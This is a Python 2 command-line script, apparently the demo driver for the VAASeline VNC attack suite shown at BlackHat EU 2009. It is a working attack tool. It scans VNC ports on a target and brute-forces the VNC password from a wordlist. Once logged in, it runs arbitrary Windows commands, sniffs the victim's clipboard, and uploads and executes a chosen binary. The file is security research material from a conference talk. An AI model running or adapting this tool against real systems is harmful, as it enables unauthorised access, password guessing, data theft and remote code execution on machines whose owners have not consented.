#! /usr/bin/env python

## VAASeline - VNC Attack Automation Suite
##
## A script to demonstrate the use of the VAASeline module VNC systems.
## Presented at BlackHat EU 2009 by Rich Smith
##
## Check for the latest version at http://www.immunityinc.com/resources-freesoftware.shtml
"""
   Copyright (C) 2009 Rich Smith (rich@immunityinc.com)

   This library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 3 of the License, or (at your option) any later version.

   This library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.

   You should have received a copy of the GNU Lesser General
   Public License along with this library; if not, write to the
   Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
   Boston, MA 02110-1301 USA
"""

##The underlying module which implements the RPC/RFB technique for the vbs clipboard we are using
## this in turn imports the core VAASeline module and uses it's primitives
from lib import ApplyVAASeline

import socket, time, sys, getopt

class vaaseline_demo:
    """
    Demo script using the VAASeline library to automate actions against a VNC
    server using the RPC over RFB technique
    """
    def __init__(self, target, binary=None, command=None, password=None, sniffer=False, wordlist=None):
        """
        Initialise payload specific variables
        """        
        socket.setdefaulttimeout(20)
        
        ##IP of the system
        self.target=target
        
        ##Ports to attempt the connect on
        self.ports=[5900,5901,5902,5903,5904,5905]
        
        ##Binary to upload and execute
        self.binary = binary
        
        ##Command to run
        self.command = command

        ##Launch the active sniffer loop
        self.do_sniffer = sniffer

        ##Passwords to use for VNC access
        ## if a specific password is passed that trumps a supplied wordlist
        if password:
            self.pw_list = [password]
            return 
        elif not wordlist:
            ##No password and no wordlist passed use our default wordlist
            wordlist = "password.dict"
            
        print password,wordlist
        
        try:
            if wordlist:
                pw_fd = open( wordlist, 'r' )
                self.pw_list = []
                for pw in pw_fd.readlines():
                    ##Remove \n & \r's
                    pw = pw.replace("\r","")
                    pw = pw.replace("\n","")
                    self.pw_list.append(pw)
                    
                pw_fd.close()
                
                print "Password file loaded."
                return
            
        except Exception, err:
            print "Error opening password list: %s"%(err)
            print "Using short static list instead."
        
        ##No wordlist supplied or error opening wordlist - use static default
        self.pw_list=["", "foobar","password"]
        return
    
        
    def __call__(self):
        """
        Go 
        """
        ##Connect to TCP port
        self.connect()
        ##Setup a VNC session
        self.vnc_login()
        ##Now start doing the funky RPC stuff
        self.vaaseline_me_up()
        

    def connect(self):
        """
        Connect to the VNC server
        """
        ##Has a valid VNC port already been found? (connect called multiple time)
        try:
            self.ports=[self.valid_port]
        except AttributeError:
            pass

        for port in self.ports:
            ##Get the rfb superclass initialised
            self.vnc_skt=ApplyVAASeline.ApplyVAASeline(self.target, port)

            try:
                ##Initiate a connection
                self.vnc_skt.init()
                
                ##Set the valid port if we haven't got one already
                try:
                    self.valid_port
                except AttributeError:
                    self.valid_port=port
                    print "VNC connection: Initialised on TCP/%d"%(port)
                break
            
            except socket.timeout, msg:
                print "VNC connection: Socket time out: TCP/%d"%(port)
            except socket.error, msg:
                print "VNC connection: ERROR: %s: TCP/%d"%(msg[1],port)
        else:
            ##No VNC port found
            sys.exit(0)


    def vnc_login(self):
        """
        Try to login into the VNC server using supplied credentials
        """
        ##Try all the passwords supplied
        for pw in self.pw_list:

            try:
                self.vnc_skt.set_pw(pw)
                ret=self.vnc_skt.auth()
                if pw == "":
                    print "VNC AUTHENTICATION: password is BLANK"
                else:
                    print "VNC AUTHENTICATION: password is '%s'"%(pw)
                break
            except ApplyVAASeline.RFBAuthError, err:
                ##Password Phail
                self.cleanup()
                self.connect()
                
            except ApplyVAASeline.RFBError, err:
                ##RFB lib we superclass from bitches on blank pass - FIXME
                print "VNC AUTHENTICATION: error",err
                self.cleanup()
                self.connect()
                
            except socket.timeout:
                ##A time at this points probably means that the server is set to pop a box
                ## to accept the connection attempt. If this is the case we're buggered
                print "VNC AUTHENTICATION: server timed out on authentication. Likely is waiting for active user approval for the connection. If this is the case the VNC server has the password \"%s\""%(pw)
                break
        else:
            ##Didn't guess the right password with any of our tries
            print "VNC AUTHENTICATION: server does not have any of the passwords checked for"
            sys.exit(1)

    def vaaseline_me_up(self):
        """
        Now we have a VNC session setup lets start automating actions against it
        """      
        ##Initialise the VAASeline module
        print "[+] Initialising VAASeline RPC over RFB......"
        self.vnc_skt.go()
        print "[+] Done"
        
        ##Simple echo - we get back what we send
        print "[+] Testing 'echo'...."
        self.vnc_skt.echo("ping")
        print "[+] Done"
        
        
        ##Run a command
        if self.command:
            print "[+] Running Win32 command '%s'...."%(self.command)
            #self.vnc_skt.run_exe(self.command,'c:\\boot.ini')
            self.vnc_skt.run_exe(self.command)
            print "[+] Done"
        
        ##Start clipboard sniffer
        if self.do_sniffer:
            print "[+] Starting active clipboard sniffer (Ctrl-C to stop and continue)"
            self.vnc_skt.start_sniffer()
            print "[+] Done"
        
        
        ##Upload a binary and run it
        if self.binary:
            print "[+] Uploading Binary: %s"%(self.binary)
            self.vnc_skt.upload_and_execute(self.binary, "V.exe")
            print "[+] Done"
        
        #print "[+] Deleting a file"
        #self.vnc_skt.del_file("filename.exe")
        #print "[+] Done"
        
        
        ##Quit
        print "[+] Quitting..."
        self.vnc_skt.quit()
        
        ##Tidy
        self.cleanup()
        print "[+] VAASeline demo complete" 

    def cleanup(self):
        try:
            self.vnc_skt.close()
        except:
            pass

def usage():
    
    print "Usage: %s [options] <IP of VNC server>"%(sys.argv[0])
    print "\nDemo the use of the VAASeline module (Rich Smith 2009)."
    print "Make sure a VNC server is listening on the IP you specify"
    print "and that you can logon."
    print "\nOptions:"
    print "-h, --help     - Show this message"
    print "-b, --binary   - Binary file to upload and execute on target"
    print "-c, --command  - Command to execute on target"
    print "-p, --password - Password to authenticate with"
    print "-w, --wordlist - Wordlist to attempt authentication with"
    print "-s, --sniffer  - Enable active clipboard sniffing on the target"


def parse_commands():
    """
    Grab passed options
    """
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hb:c:p:sw:", ["help", "binary=", "command=", "password=", "sniffer", "wordlist="])
    except getopt.GetoptError, err:
        print str(err)
        usage()
        sys.exit(2)

    sniffer = False
    command = None
    binary  = None
    wordlist = None
    password = None
    for o, a in opts:
        if o in ("-s", "--sniffer"):
            sniffer = True
            
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
            
        elif o in ("-b", "--binary"):
            binary = a
        
        elif o in ("-c", "--command"):
            command = a
            
        elif o in ("-w", "--wordlist"):
            wordlist = a
            
        elif o in ("-p", "--pass"):
            password = a            
            
        else:
            assert False, "unhandled option"
            
    target = args[0]
        
    print target, binary, command, password, sniffer, wordlist
    return target, binary, command, password, sniffer, wordlist
    
if __name__ == "__main__":
    
    if len(sys.argv) < 2:
        usage()
        sys.exit(-1)
    
    target, binary, command, password, sniffer, wordlist = parse_commands()
        
    print "VAASeline demo (Rich Smith 2009)\n\n"
    #if not binary:
        #binary = "uploadme.exe"
    #if not command:
        #command = "calc.exe"
    vas = vaaseline_demo(target, binary, command, password, sniffer, wordlist)
    vas()
    
